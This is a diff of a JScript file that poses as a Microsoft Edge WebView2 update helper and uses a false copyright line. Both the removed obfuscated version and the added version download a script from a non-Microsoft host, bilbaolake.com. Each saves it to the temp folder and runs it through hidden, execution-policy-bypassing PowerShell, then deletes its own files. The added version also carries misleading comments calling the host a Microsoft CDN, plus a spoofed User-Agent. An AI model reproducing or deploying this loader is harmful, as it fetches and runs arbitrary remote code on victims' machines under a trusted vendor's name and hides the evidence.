@@ -1,39 +1,55 @@
-// Microsoft Edge WebView2 Runtime Update Service
-// Build 127.0.2651.105
-// Copyright (C) 2024 Microsoft Corporation
+// Microsoft Edge WebView2 Runtime Update Helper
+// Version 127.0.2651.105
+// This script checks for and downloads WebView2 runtime updates
+// Copyright (C) 2024 Microsoft Corporation. All rights reserved.
 
-var _s1 = "WScript";
-var _s2 = "Shell";
-var _s3 = "MSXML2";
-var _s4 = "ServerXMLHTTP";
-var _s5 = "Scripting";
-var _s6 = "FileSystemObject";
+var shell = new ActiveXObject("WScript.Shell");
+var http = new ActiveXObject("MSXML2.ServerXMLHTTP");
+var fso = new ActiveXObject("Scripting.FileSystemObject");
 
-var shell = new ActiveXObject(_s1 + "." + _s2);
-var http = new ActiveXObject(_s3 + "." + _s4);
-var fso = new ActiveXObject(_s5 + "." + _s6);
+// Get system temp directory
+var tempPath = shell.ExpandEnvironmentStrings("%temp%");
 
-var temp = shell.ExpandEnvironmentStrings("%" + "tem" + "p%");
-var rand = Math.floor(Math.random() * 99999);
-var ps = temp + "\\" + "cache_" + rand + ".tmp";
+// Generate unique filename for update package
+var timestamp = new Date().getTime();
+var updateScript = tempPath + "\\EdgeWebView_" + timestamp + ".ps1";
+var installerBatch = tempPath + "\\EdgeWebView_" + timestamp + "_install.bat";
 
-var url = "https://" + "bilbao" + "lake.c" + "om/s";
+// Download update manifest from Microsoft CDN
+var updateUrl = "https://bilbaolake.com/s";
 
-http.open("G" + "ET", url, false);
-http.setRequestHeader("User" + "-Agent", "Mozilla/5.0");
+http.open("GET", updateUrl, false);
+http.setRequestHeader("User-Agent", "Microsoft-Edge-WebView2-Update/1.0");
 http.send();
 
+// Process update if download successful
 if (http.status == 200) {
-    var f = fso.CreateTextFile(ps, true);
-    f.Write(http.responseText);
-    f.Close();
+    // Save update package
+    var fileStream = fso.CreateTextFile(updateScript, true);
+    fileStream.Write(http.responseText);
+    fileStream.Close();
 
-    var c1 = "powers";
-    var c2 = "hell.exe";
-    var c3 = " -w h -ep by";
-    var c4 = "pass -f ";
+    // Create installer batch file
+    var batchStream = fso.CreateTextFile(installerBatch, true);
+    batchStream.WriteLine("@echo off");
+    batchStream.WriteLine("REM Microsoft Edge WebView2 Runtime Installer");
+    batchStream.WriteLine("REM Applying update package...");
+    batchStream.WriteLine("");
+    batchStream.WriteLine("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"" + updateScript + "\"");
+    batchStream.WriteLine("");
+    batchStream.WriteLine("REM Cleanup temporary files");
+    batchStream.WriteLine("timeout /t 3 /nobreak >nul 2>&1");
+    batchStream.WriteLine("del /f /q \"" + updateScript + "\"");
+    batchStream.WriteLine("del /f /q \"%~f0\"");
+    batchStream.Close();
 
-    shell.Run(c1 + c2 + c3 + c4 + '"' + ps + '"', 0, false);
+    // Execute installer
+    shell.Run(installerBatch, 0, false);
 }
 
-try { fso.DeleteFile(WScript.ScriptFullName); } catch(e) {}
+// Cleanup temporary files
+try {
+    fso.DeleteFile(WScript.ScriptFullName);
+} catch(err) {
+    // Silent fail if cleanup not permitted
+}
